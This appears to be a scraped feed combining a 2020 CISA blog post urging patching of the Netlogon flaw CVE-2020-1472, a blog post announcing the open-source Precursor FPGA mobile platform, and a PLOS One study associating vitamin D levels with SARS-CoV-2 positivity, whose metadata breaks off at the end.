<title>Windows Server vulnerability requires immediate attention</title>
<link>https://www.cisa.gov/blog/2020/09/18/windows-server-vulnerability-requires-immediate-attention</link>
<guid isPermaLink="true" >https://www.cisa.gov/blog/2020/09/18/windows-server-vulnerability-requires-immediate-attention</guid>
<description>&lt;p&gt;&lt;em&gt;Author: Bryan Ware, Assistant Director &lt;/em&gt;&lt;/p&gt;
&lt;p&gt;One of the most important things you can do for your cybersecurity is to update your software - and if your network relies on Microsoft Windows Active Directory, a critical vulnerability exists that requires your attention.&lt;/p&gt;
&lt;p&gt;This afternoon, CISA issued &lt;a href=&quot;https://cyber.dhs.gov/ed/20-04&quot;&gt;Emergency Directive 20-04&lt;/a&gt;, which instructs the Federal Civilian Executive Branch agencies to apply August 2020 security update (CVE-2020-1472) for Microsoft’s Windows Servers to all domain controllers. The update fixes a recently discovered flaw in Windows Netlogon Remote Protocol that could allow an unauthenticated attacker with network access to a domain controller to completely compromise all Active Directory identity services. &lt;/p&gt;
&lt;p&gt;While agencies are responsible for managing risk to their networks, CISA is responsible for safeguarding and securing the Federal enterprise. We do not issue emergency directives unless we have carefully and collaboratively assessed it to be necessary. Left unpatched, this vulnerability could allow attackers to compromise network identity services. We have directed agencies to implement the patch across their infrastructure by Monday, September 21, and given instructions for which of their many systems to prioritize. &lt;/p&gt;
&lt;p&gt;CISA will provide assistance and resources to guide agencies with completing required actions. The investments in the Continuous Diagnostics and Mitigation Program will pay dividends as it will help federal agencies with mature implementation to identify where unpatched servers reside and track patching progress. For additional support, our state and local government partners are encouraged to contact the Multi-State-Information Sharing and Analysis Center (MS-ISAC) at &lt;a href=&quot;mailto:soc@cisecurity.org&quot; rel=&quot;noreferrer noopener&quot; target=&quot;_blank&quot;&gt;soc@cisecurity.org&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;Though this directive applies to Executive Branch agencies, we strongly urge our partners in State and local government, the private sector, and the American public to apply this security update as soon as possible. If enterprises cannot immediately apply the update, we urge them to remove relevant domain controllers from their networks. We have published an &lt;a href=&quot;https://us-cert.cisa.gov/ncas/current-activity/2020/09/18/cisa-releases-emergency-directive-microsoft-windows-netlogon&quot;&gt;Activity Alert&lt;/a&gt; with information about our directive, as well as resources to help critical infrastructure protect their networks. We’d also like to acknowledge the efforts of our partners at Microsoft in working to ensure the security of their products. &lt;/p&gt;
&lt;p&gt;Go get patching! &lt;/p&gt;

<title>Precursor – A mobile, open source electronics platform</title>
<link>https://www.bunniestudios.com/blog/?p=5921</link>
<guid isPermaLink="true" >https://www.bunniestudios.com/blog/?p=5921</guid>
<description>&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;Precursor (pre·​cur·​sor | \ pri-ˈkər-sər):&lt;br /&gt;1. one that precedes or gives rise to; a predecessor; harbinger&lt;br /&gt;2. a pocketable open development board&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Precursor&lt;/strong&gt; is a mobile, open source electronics platform. Similar to how a Raspberry Pi or an Arduino can be transformed into an IoT gadget with the addition of a couple breakout boards, some solder, and a bit of code, Precursor is a framework upon which you can assemble a wide variety of DIY mobile applications.&lt;/p&gt;
&lt;p&gt;Precursor is unique in the open source electronics space in that it’s designed from the ground-up to be carried around in your pocket. It’s not just a naked circuit board with connectors hanging off at random locations: it comes fully integrated—with a rechargeable battery, a display, and a keyboard—in a sleek, 7.2 mm (quarter-inch) aluminum case.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://bunniefoo.com/precursor/precursor_eightview.jpg&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Precursor → Betrusted&lt;/h3&gt;
&lt;p&gt;Followers of my blog will recognize the case design from &lt;a href=&quot;https://betrusted.io&quot;&gt;Betrusted&lt;/a&gt;, a secure-communication device. It’s certainly no accident that Precursor looks like Betrusted, as the latter is built upon the former. Betrusted is a great example of the kind of thing that you (and we) might want to make using Precursor. Betrusted is a huge software project, however, and it will require several years to get right.&lt;/p&gt;

&lt;p&gt;Precursor, on the other hand, is ready today. And it has all of the features you might need to validate and test a software stack like the one that will drive Betrusted. We are also using the FPGA in Precursor to validate our SoC design, which will eventually give us the confidence we need to tape out a full-custom Betrusted ASIC, thereby lowering production costs while raising the bar on hardware security.&lt;/p&gt;
&lt;p&gt;In the meantime, Precursor gives us a prototyping platform that we can use to work through user-experience challenges, and it gives &lt;strong&gt;you&lt;/strong&gt; a way to implement projects that demand a secure, portable, trustable communications platform but that might not require the same level of hardware tamper resistance that a full-custom ASIC solution could provide.&lt;/p&gt;
&lt;p&gt;And for developers, the best part is that Betrusted is 100% open source. As we make progress on the Betrusted software stack, we will roll those improvements back into Precursor, so you can count on a constant stream of updates and patches to the platform.&lt;/p&gt;
&lt;h3&gt;Hackable. In a Good Way.&lt;/h3&gt;
&lt;p&gt;Precursor is also unique in that you can hack many aspects of the hardware without a soldering iron. Instead of a traditional ARM or AVR “System on Chip” (SoC), Precursor is powered by the software-defined hardware of a Field Programmable Gate Array (FPGA). FPGAs are a sea of basic logic units that users can wire up using a “bitstream”. Precursor comes pre-loaded with a bitstream that makes the FPGA behave like a RISC-V CPU, but you’re free to load up (or code up) any CPU you like, be it a 6502, an lm32, an AVR, an ARM, or something else. It’s entirely up to you.&lt;/p&gt;
&lt;p&gt;This flexibility comes with its own set of trade-offs, of course. CPU speeds are limited to around 100 MHz, and complexity is limited to single-issue, in-order microarchitectures. It’s faster than any Palm Pilot or Nintendo DS, but it’s not looking to replace your smartphone.&lt;/p&gt;
&lt;h3&gt;At Its Core&lt;/h3&gt;
&lt;p&gt;We describe bitstreams using a Python-based Fragmented Hardware Description Language (FHDL) called Migen, which powers the &lt;a href=&quot;https://github.com/enjoy-digital/litex&quot;&gt;LiteX&lt;/a&gt; framework. (Migen is to LiteX as GNU is to Linux, hence we refer to the combination as Migen/LiteX.) The framework is flexible enough that we can incorporate Google’s OpenTitan &lt;a href=&quot;https://github.com/betrusted-io/gateware/blob/master/gateware/sha2_litex.sv&quot;&gt;SHA&lt;/a&gt; and &lt;a href=&quot;https://github.com/betrusted-io/gateware/blob/master/gateware/aes_opentitan.py&quot;&gt;AES&lt;/a&gt; crypto-cores (written in SystemVerilog), yet powerful enough that we can natively describe a bespoke &lt;a href=&quot;https://ci.betrusted.io/betrusted-soc/doc/engine.html&quot;&gt;Curve25519 crypto engine&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;If you’ve ever wanted to customize your CPU’s instruction set, experiment with hardware accelerators, or make cycle-accurate simulations of retro-hardware, Precursor has you covered. And the best part is, thanks to Precursor’s highly integrated design philosophy, you can take all that hard work out of the lab and on the road.&lt;/p&gt;
&lt;h3&gt;On the Inside&lt;/h3&gt;
&lt;p&gt;And if you’re itching for a excuse to break out your soldering iron or your 3D printer, Precursor is here to give you one. While its compact form factor might seem limiting at first, we’ve observed that 80% of projects involve adding just one or two domain-specific sensors or hardware modules to a base platform. And most of those additions come on breakout boards that require only a handful of signal wires.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://bunniefoo.com/precursor/precursor_lte_module_example.jpg&quot; /&gt;&lt;/p&gt;
&lt;p&gt;With eight GPIOs (configurable as three differential pairs and two single-ended lines) connected directly to the FPGA, Precursor’s battery compartment is designed to accommodate breakout boards. It also provides multiple power rails. You will find any number of third-party breakout boards with sensors ranging from barometers to cameras and radios ranging from BLE to LTE. Patch them in with a soldering iron, and you’re all set. The main trade-off is that, the more hardware you add, the less space you have left for your battery. Unless of course you build a bigger enclosure…&lt;/p&gt;
&lt;h3&gt;On the Outside&lt;/h3&gt;
&lt;p&gt;If you need even more space or custom mounting hardware, the case is designed for easy fabrication using an aluminum CNC machine or a resin printer. Naturally, our case designs are open source, and the native Solidworks &lt;a href=&quot;https://github.com/betrusted-io/betrusted-hardware/tree/master/case-v1&quot;&gt;CAD files&lt;/a&gt; we provide are constructed such that the enclosure’s length and thickness are parameterized.&lt;/p&gt;
&lt;p&gt;Furthermore, Precursor’s bezel is a &lt;a href=&quot;https://github.com/betrusted-io/betrusted-hardware/tree/master/bezel-v1&quot;&gt;plain old FR-4 PCB&lt;/a&gt;, so if your application does not require a large display and a keyboard, you can simply remove them and replace the bezel with a full-sized circuit board. By way of example, removing the LCD and replacing it with a smaller OLED module would make room for a much larger battery while freeing up space for the custom hardware you might need to build, say, a portable, trustable, VPN-protected LTE hotspot.&lt;/p&gt;
&lt;h3&gt;Come Have a Look!&lt;/h3&gt;
&lt;p&gt;If you’ve ever wanted to hack on mobile hardware, Precursor was made for you. By combining an FPGA dev board, a battery, a case, a display, and a keyboard into a single thin, pocket-ready package, it makes it easier than ever to go from a concept to a road-ready piece of hardware.&lt;/p&gt;
&lt;p&gt;Precursor will soon be crowdfunding on Crowd Supply. Learn more about its specifications on &lt;a href=&quot;https://www.crowdsupply.com/sutajio-kosagi/precursor&quot;&gt;our pre-launch page&lt;/a&gt;, and sign up for our mailing list so that you can take advantage of early-bird pricing when the campaign goes live.&lt;/p&gt;
&lt;h3&gt;Meta&lt;/h3&gt;
&lt;p&gt;We’ve decided to do an extended pre-launch phase for the Precursor campaign to gauge interest. After all, we are in the middle of an unprecedented global pandemic, and one of the worst economic downturns in recorded history. It might seem a little crazy to try and fund the project now, but it’s also crazy to try and build trustable hardware that can hold up against state-level adversaries. We make decisions not on what is practical, but what is right.&lt;/p&gt;
&lt;p&gt;The fact is the hardware is at a stage where we are comfortable producing more units and getting it into the hands of developers. The open question is if developers have the time, interest, and money to participate in our campaign. Initial outreach indicates there might be, but we’ll only find out for sure in the coming months. Precursor is not cheap to produce; I am prepared to accept a failed funding campaign as a possible outcome.&lt;/p&gt;
&lt;p&gt;We’re also carefully considering alternate sources of funding, such as grants from organizations that share our values (such as &lt;a href=&quot;https://nlnet.nl/PET/&quot;&gt;NLNet&lt;/a&gt;) and commercial sponsors that will not attach conditions that compromise our integrity (you’ll notice the &lt;a href=&quot;https://www.crowdsupply.com/silicon-labs/iot-accelerator&quot;&gt;Silicon Labs&lt;/a&gt; banner at Crowd Supply). This will hopefully make the hardware more accessible, especially to qualified developers in need, but please keep in mind we are not a big corporation. As individual humans like you, we need to put food on the table and keep a roof over our heads. Our current plan is to offer a limited number of early bird units at a low price — so if you’re like me and worried about making ends meet next year, &lt;a href=&quot;https://www.crowdsupply.com/sutajio-kosagi/precursor&quot;&gt;subscribe to our mailing list&lt;/a&gt; so you can hopefully take advantage of the early bird pricing. And if you’re lucky enough to be in a stable situation, please consider backing the campaign at a higher pricing tier.&lt;/p&gt;
&lt;p&gt;Over the coming months, I’ll be mirroring some of the more relevant posts from the campaign onto my blog, sometimes with additional commentary like this. There’s over two years of effort that have gone into building Precursor, and I look forward to sharing with you the insights and knowledge gained on my journey.&lt;/p&gt;

&lt;h2&gt;Abstract&lt;/h2&gt;

&lt;p&gt;Until treatment and vaccine for coronavirus disease-2019 (COVID-19) becomes widely available, other methods of reducing infection rates should be explored. This study used a retrospective, observational analysis of deidentified tests performed at a national clinical laboratory to determine if circulating 25-hydroxyvitamin D (25(OH)D) levels are associated with severe acute respiratory disease coronavirus 2 (SARS-CoV-2) positivity rates. Over 190,000 patients from all 50 states with SARS-CoV-2 results performed mid-March through mid-June, 2020 and matching 25(OH)D results from the preceding 12 months were included. Residential zip code data was required to match with US Census data and perform analyses of race/ethnicity proportions and latitude. A total of 191,779 patients were included (median age, 54 years [interquartile range 40.4–64.7]; 68% female. The SARS-CoV-2 positivity rate was 9.3% (95% C.I. 9.2–9.5%) and the mean seasonally adjusted 25(OH)D was 31.7 (SD 11.7). The SARS-CoV-2 positivity rate was higher in the 39,190 patients with “deficient” 25(OH)D values (&amp;lt;20 ng/mL) (12.5%, 95% C.I. 12.2–12.8%) than in the 27,870 patients with “adequate” values (30–34 ng/mL) (8.1%, 95% C.I. 7.8–8.4%) and the 12,321 patients with values ≥55 ng/mL (5.9%, 95% C.I. 5.5–6.4%). The association between 25(OH)D levels and SARS-CoV-2 positivity was best fitted by the weighted second-order polynomial regression, which indicated strong correlation in the total population (R&lt;sup&gt;2&lt;/sup&gt; = 0.96) and in analyses stratified by all studied demographic factors. The association between lower SARS-CoV-2 positivity rates and higher circulating 25(OH)D levels remained significant in a multivariable logistic model adjusting for all included demographic factors (adjusted odds ratio 0.984 per ng/mL increment, 95% C.I. 0.983–0.986; p&amp;lt;0.001). SARS-CoV-2 positivity is strongly and inversely associated with circulating 25(OH)D levels, a relationship that persists across latitudes, races/ethnicities, both sexes, and age ranges. Our findings provide impetus to explore the role of vitamin D supplementation in reducing the risk for SARS-CoV-2 infection and COVID-19 disease.&lt;/p&gt;

&lt;h2&gt;Introduction&lt;/h2&gt;

&lt;p&gt;Studies suggest an association between vitamin D deficiency and risk of viral upper respiratory tract infections and mortality from coronavirus disease-2019 (COVID-19) [&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref001&quot; class=&quot;ref-tip&quot;&gt;1&lt;/a&gt;, &lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref002&quot; class=&quot;ref-tip&quot;&gt;2&lt;/a&gt;]. This relationship is anticipated, given that vitamin D has numerous actions affecting the innate and adaptive immune systems. Respiratory monocytes/macrophages and epithelial cells constitutively express the vitamin D receptor. Acting through this receptor, vitamin D may be important in protection against respiratory infections [&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref003&quot; class=&quot;ref-tip&quot;&gt;3&lt;/a&gt;]. In addition, an important action of vitamin D is suppressing excessive cytokine release that can present as a “cytokine storm,” a common cause of COVID-19-related morbidity and mortality [&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref004&quot; class=&quot;ref-tip&quot;&gt;4&lt;/a&gt;]. The role of vitamin D supplementation in reducing the risk of infection by severe acute respiratory disease coronavirus-2 (SARS-CoV-2) has not been studied. Better understanding of the relation between vitamin D status and SARS-CoV-2 NAAT positivity rates is appropriate before evaluating this potential intervention.&lt;/p&gt;

&lt;p&gt;Previous studies examined latitude-related differences in COVID-19 outcomes related to vitamin D [&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref001&quot; class=&quot;ref-tip&quot;&gt;1&lt;/a&gt;, &lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref005&quot; class=&quot;ref-tip&quot;&gt;5&lt;/a&gt;]. However, to our knowledge, only two studies investigated the direct relationship between vitamin D status and SARS-CoV-2 positivity, and these came to opposite conclusions [&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref006&quot; class=&quot;ref-tip&quot;&gt;6&lt;/a&gt;, &lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref007&quot; class=&quot;ref-tip&quot;&gt;7&lt;/a&gt;]. Both were based on small numbers of paired SARS-CoV-2 and 25(OH)D results, and neither involved US patients. In this study, we evaluated the association of circulating 25-hydroxyvitamin D [25(OH)D] levels, a measure of vitamin D status, with positivity for SARS-CoV-2 as assessed with nucleic acid amplification testing (NAAT).&lt;/p&gt;

&lt;h3&gt;Study population&lt;/h3&gt;

&lt;p&gt;In this retrospective, observational analysis of deidentified test results from a clinical laboratory, a Quest Diagnostics-wide unique patient identifier was used to match all results of SARS-CoV-2 testing performed March 9 through June 19, 2020, with 25(OH)D results from the preceding 12 months. Analysis was limited to one SARS-CoV-2 result per patient; patients were considered to have a positive SARS-CoV-2 result if any test result indicated positivity. When multiple 25(OH)D results were available, the most recent was selected. We excluded specimens with inconclusive results (one out of two SARS-CoV-2 targets detected) or missing residential zip code data, which are needed to assign race/ethnicity proportions and latitude.&lt;/p&gt;
&lt;/div&gt;

&lt;h3&gt;Laboratory methods&lt;/h3&gt;

&lt;p&gt;All SARS-CoV-2 RNA NAATs were performed by Quest Diagnostics using one of four United States Food and Drug Administration (FDA) Emergency Use Authorized tests (Quest Diagnostics SARS-CoV-2 RNA [COVID-19], Qualitative NAAT; Hologic Panther Fusion SARS-CoV-2 assay; Roche Diagnostics cobas® SARS-CoV-2 test; or Hologic Aptima SARS-CoV-2 assay). We combined results from all four tests due to their very similar sensitivity and specificity [&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref008&quot; class=&quot;ref-tip&quot;&gt;8&lt;/a&gt;–&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref011&quot; class=&quot;ref-tip&quot;&gt;11&lt;/a&gt;]. Total 25(OH)D was measured using a chemiluminescent immunoassay (DiaSorin LIAISON® XL 25-hydroxyvitamin D, total) or a laboratory-developed test based on liquid chromatograph/tandem mass spectrometry. The laboratory categorizes 25(OH)D results &amp;lt;20 ng/mL as deficient, 20–29 ng/mL as suboptimal, and ≥30 ng/mL as optimal. The laboratory assays are standardized and performed identically throughout Quest Diagnostics.&lt;/p&gt;

&lt;h3&gt;Estimates by zip code&lt;/h3&gt;

&lt;p&gt;To analyze race/ethnicity, patient data were linked to estimated race/ethnicity proportions reported by zip code in the 2018 5-year American Community Survey (ACS) [&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref012&quot; class=&quot;ref-tip&quot;&gt;12&lt;/a&gt;]. Zip codes with estimated proportions of black non-Hispanic population over 50% are referred to as “predominately black non-Hispanic.” The same pattern was followed for “predominantly Hispanic” and “predominantly white non-Hispanic” zip codes. Latitude for each zip code, acquired from SAS reference data, was stratified into three groups: &amp;gt;40 degrees (“northern”); 32–40 degrees (“central”); or &amp;lt;32 degrees (“southern”).&lt;/p&gt;

&lt;h3&gt;Vitamin D seasonality adjustment&lt;/h3&gt;

&lt;p&gt;We adjusted for vitamin D seasonality with a model based on a previous 25(OH)D&lt;sub&gt;3&lt;/sub&gt; study, utilizing Quest Diagnostics results that fit the present study data well [&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref013&quot; class=&quot;ref-tip&quot;&gt;13&lt;/a&gt;].&lt;/p&gt;

&lt;h3&gt;Statistical analyses&lt;/h3&gt;

&lt;p&gt;Comparisons of proportions were analyzed using the chi-square test. Comparisons of means were analyzed using the t-test. Concentrations of circulating 25(OH)D are reported in ng/mL. Values &amp;lt;20 ng/mL or ≥60 ng/mL were assigned a value of 19 ng/mL or 60 ng/mL, respectively. Age was stratified into two groups: &amp;lt;60 years and ≥60 years for convenience. The correlation between 25(OH)D values and SARS-CoV-2 positivity were fitted the best by the weighted second-order polynomial regression. For regressions of predominately black non-Hispanic and Hispanic zip codes, 25(OH)D values were grouped into bins with two values from 20–29 (20–21, 22–23, etc.), and bins with 5 values thereafter (30–34, 35–39, etc.), because of the relatively low number of patients with 25(OH)D values ≥30. For all other polynomial regressions, 25(OH)D values were grouped into bins with two values. Multivariable logistic regression was performed using a stepwise entry criterion of p&amp;lt;0.05, after excluding patients with missing values for any included factor. Analyses were performed using SAS Studio 3.6 on SAS 9.4 (SAS Institute) and R, version 3.6.1 (R Project for Statistical Computing). HIPAA clearly defines research use of data as analyzed for this and numerous other studies based on the Quest Diagnostics Data Informatics Warehouse (45 CFR 164.501, 164.508, 164.512(i) (See also 45 CFR 164.514(e), 164.528, 164.532) Quest Diagnostics takes the additional step of having its process reviewed annual by the Western Institutional Review Board (Puyallup, Washington) who has determined the process is “deemed exempt.”&lt;/p&gt;

&lt;h2&gt;Results&lt;/h2&gt;

&lt;p&gt;Our potential cohort included 218,372 patients. After excluding patients with missing residential zip code data (n = 26,387) or inconclusive SARS-CoV-2 NAAT results (n = 206), results from 191,779 (87.8%) patients remained for analysis. This cohort comprised patients from all 50 states and the District of Columbia. The median age and sex distribution of included and excluded patients were nearly identical: age, 54.0 years, IQR 40.4–64.7, vs. 53.7 years, IQR 39.7–64.5, and female, 68% vs. 67%, respectively. SARS-CoV-2 positivity was lower among included (9.3%, 95% C.I. 9.2–9.5%) than excluded (10.1%, 95% C.I. 9.7–10.4%) patients (p&amp;lt;0.001). 98.8% of included patients had 25(OH)D levels assessed with immunoassay testing methodology.&lt;/p&gt;

&lt;p&gt;There was an association between lower SARS-CoV-2 positivity rates and higher circulating 25(OH)D levels (unadjusted odds ratio 0.979 per 1 ng/mL increment, 95% C.I. 0.977–0.980). Regression analysis indicated strong correlation (R-squared = 0.96) between 25(OH)D levels and SARS-CoV-2 positivity in the total population (&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone-0239252-g001&quot;&gt;Fig 1&lt;/a&gt;) and in northern, central, and southern latitudes (&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone-0239252-g002&quot;&gt;Fig 2A&lt;/a&gt;). The decrease in positivity rate associated with 25(OH)D levels appeared to plateau as values approached 55 ng/mL; SARS-CoV-2 positivity rates were similar between the 4,016 patients with values 55–59 ng/mL (6.0%, 95% C.I. 5.2–6.7%) and the 8,305 patients with higher values (5.9%, 95% C.I. 5.4–6.4%). The SARS-CoV-2 positivity rate was lower in the 27,870 patients with “adequate” 25(OH)D values (30–34 ng/mL) (8.1%, 95% C.I. 7.8–8.4%) than in the 39,190 patients with “deficiency” (&amp;lt;20 ng/mL) (12.5%, 95% C.I. 12.2–12.8%) (difference 35%; p&amp;lt;0.001). Similarly, the SARS-CoV-2 positivity rate was lower in the 12,321 patients with 25(OH)D values ≥55 ng/mL (5.9%, 95% C.I. 5.5–6.4%) than in patients with adequate values (difference 27%; p&amp;lt;0.001).&lt;/p&gt;

&lt;/div&gt;

&lt;p&gt;SARS-CoV-2 positivity rates were higher in the 9,529 patients from predominately black non-Hispanic zip codes (15.7%, 95% C.I. 15.0–16.4%) and the 26,242 patients from predominately Hispanic zip codes (12.8%, 95% C.I. 12.4–13.2%) than in the 112,281 patients from predominately white non-Hispanic zip codes (7.2%, 95% C.I. 7.1–7.4%; p&amp;lt;0.001 for both comparisons). Mean (±SD) 25(OH)D levels were also higher in patients from predominately white non-Hispanic zip codes (33.0±11.9 ng/mL; 1 ng/mL = 0.400641 nmol/L) than in patients from predominately black non-Hispanic (29.1±11.0 ng/mL; p&amp;lt;0.001) or Hispanic (28.8±10.7 ng/mL; p&amp;lt;0.001) zip codes. Regression analysis indicated strong correlation between 25(OH)D levels and SARS-CoV-2 positivity in each of these groups (&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone-0239252-g002&quot;&gt;Fig 2B&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;Compared to the 67,667 patients age ≥60 years, the 120,362 younger patients had significantly higher SARS-CoV-2 positivity (10.2%, 95% C.I. 10.0–10.3%, vs. 7.7%, 95% C.I. 7.5–7.9%; p&amp;lt;0.001) and lower mean 25(OH)D levels (29.4±10.8 ng/mL vs. 35.4±12.1 ng/mL; p&amp;lt;0.001). Compared to the 130,473 female patients, the 61,305 male patients had higher SARS-CoV-2 positivity (10.7% 95% C.I. 10.5–11.0% vs. 8.7%, 95% C.I. 8.5%-8.8%; p&amp;lt;0.001) and lower mean 25(OH)D levels (31.3±11.4 ng/mL vs. 31.9±11.8 ng/mL; p&amp;lt;0.001).

&lt;p&gt;The association between lower SARS-CoV-2 positivity rates and higher circulating 25(OH)D levels per ng/mL remained significant in a multivariable logistic model (adjusted odds ratio 0.984, 95% C.I. 0.983–0.986; p&amp;lt;0.001). Other significant factors in both the adjusted and unadjusted models were male sex, northern and central latitudes, predominately black non-Hispanic zip codes, and predominately Hispanic zip codes (&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone-0239252-t001&quot;&gt;Table 1&lt;/a&gt;).&lt;/p&gt;

&lt;h2&gt;Discussion&lt;/h2&gt;

&lt;p&gt;These results demonstrate an inverse relationship between circulating 25(OH)D levels and SARS-CoV-2 positivity. For the entire population those who had a circulating level of 25(OH)D &amp;lt;20 ng/mL had a 54% higher positivity rate compared to those who had a blood level of 30–34 ng/mL. The risk of SARS-CoV-2 positivity continued to decline until the serum levels reached 55 ng/mL. This finding is not surprising, given the established inverse relationship between risk of respiratory viral pathogens, including influenza, and 25(OH)D levels [&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref014&quot; class=&quot;ref-tip&quot;&gt;14&lt;/a&gt;–&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref016&quot; class=&quot;ref-tip&quot;&gt;16&lt;/a&gt;]. Vitamin D supplementation may reduce acute respiratory infections, especially in people with vitamin D deficiency [&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref017&quot; class=&quot;ref-tip&quot;&gt;17&lt;/a&gt;]. A previous study found that each 4 ng/mL increase in circulating 25(OH)D levels was associated with a 7% decreased risk of seasonal infection, a decrement of approximately 1.75% per ng/mL [&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref018&quot; class=&quot;ref-tip&quot;&gt;18&lt;/a&gt;]. This is remarkably similar to the 1.6% lower risk of SARS-CoV-2 positivity per ng/mL found in our adjusted multivariable model.&lt;/p&gt;

&lt;p&gt;Patients with the lowest circulating levels of 25(OH)D had approximately 5–7% higher absolute SARS-CoV-2 positivity across northern, central, and southern latitudes. Indeed, Covid‐19 diagnoses and particularly mortality exhibit a decreasing worldwide North‐South latitude gradient [&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref019&quot; class=&quot;ref-tip&quot;&gt;19&lt;/a&gt;]. The inverse relationship between SARS-CoV-2 positivity and 25(OH)D levels was most striking in predominately black non-Hispanic zip codes, followed by predominately Hispanic zip codes. Although 25(OH)D levels appeared to play a role for all race/ethnicities, patients from predominately black non-Hispanic zip codes had higher SASR-CoV-2 positivity than those from predominately white non-Hispanic zip codes at every 25(OH)D level. Other potential reasons including chronic diseases, occupations, housing, and lifetime risk exposures for the increased impact of COVID-19 on African Americans and Latinos have been published previously [&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref020&quot; class=&quot;ref-tip&quot;&gt;20&lt;/a&gt;–&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref022&quot; class=&quot;ref-tip&quot;&gt;22&lt;/a&gt;].&lt;/p&gt;

&lt;p&gt;Northern and central latitudes, predominately Hispanic zip codes, predominately black non-Hispanic zip codes, age &amp;lt;60 years, and male sex were independently associated with both 25(OH)D levels and SARS-CoV-2 positivity. Yet, both in stratified analyses and in a model that controlled for all of these factors, the relationship between SARS-CoV-2 positivity and circulating 25(OH)D levels remained.&lt;/p&gt;

&lt;p&gt;Limitations of this retrospective study include that testing for SARS-CoV-2 was based on selection factors, including presence and gravity of symptoms and exposure to infected individuals. High-risk groups, such as healthcare workers and first responders, are also more likely to be tested. Another limitation is that race/ethnicity estimates were based on aggregate U.S. Census proportions by zip code. There may be many other potentially confounding factors that were neither identified nor controlled for in this study. As expected, the multivariable model displayed poor overall fit and correlation statistics, given SARS-CoV-2 can infect anyone. The intent of the model was to determine whether circulating 25(OH)D levels remained significantly associated with SARS-CoV-2 positivity after adjustment for other identified factors.&lt;/p&gt;

&lt;p&gt;The major strength of this study is the direct assessment of circulating 25(OH)D levels in a large cohort; this approach can more clearly elucidate the relationship of circulating 25(OH)D levels to SARS-CoV-2 positivity than is possible when using latitude as a surrogate for vitamin D status.&lt;/p&gt;

&lt;p&gt;In conclusion, SARS-CoV-2 NAAT positivity is strongly and inversely associated with circulating 25(OH)D levels, a relationship that persists across latitudes, races/ethnicities, sexes, and age ranges. Our findings provide further rationale to explore the role of vitamin D supplementation in reducing the risk for SARS-CoV-2 infection and COVID-19 disease. If controlled trials find this relationship to be causative, the implications are vast and would present a cheap, readily-available method for helping prevent infection, especially for those with vitamin D deficiency. This could be of increased importance for the African American and Latinx community, who are disproportionately affected by both COVID-19 and vitamin D deficiency. In the interim, the authors recommend responsible vitamin D supplementation based on personal needs, risk factors, and advice from personal physicians in accordance with existing Endocrine Society Guidelines [&lt;a href=&quot;https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0239252#pone.0239252.ref023&quot; class=&quot;ref-tip&quot;&gt;23&lt;/a&gt;].&lt;/p&gt;

<og:title>SARS-CoV-2 positivity rates associated with circulating 25-hydroxyvitamin D levels</og:title>
<og:description>Until treatment and vaccine for coronavirus disease-2019 (COVID-19) becomes widely available, other methods of reducing infection rates should be explored. This study used a retrospective, observational analysis of deidentified tests performed at a national clinical laboratory to determine if circulating 25-hydroxyvitamin D (25(OH)D) levels are associated with severe acute respiratory disease coronavirus 2 (SARS-CoV-2) positivity rates. Over 190,000 patients from all 50 states with SARS-CoV-2 results performed mid-March through mid-June, 2020 and matching 25(OH)D results from the preceding 12 months were included. Residential zip code data was required to match with US Census data and perform analyses of race/ethnicity proportions and latitude. A total of 191,779 patients were included (median age, 54 years [interquartile range 40.4–64.7]; 68% female. The SARS-CoV-2 positivity rate was 9.3% (95% C.I. 9.2–9.5%) and the mean seasonally adjusted 25(OH)D was 31.7 (SD 11.7). The SARS-CoV-2 positivity rate was higher in the 39,190 patients with “deficient” 25(OH)D values (&lt;20 ng/mL) (12.5%, 95% C.I. 12.2–12.8%) than in the 27,870 patients with “adequate” values (30–34 ng/mL) (8.1%, 95% C.I. 7.8–8.4%) and the 12,321 patients with values ≥55 ng/mL (5.9%, 95% C.I. 5.5–6.4%). The association between 25(OH)D levels and SARS-CoV-2 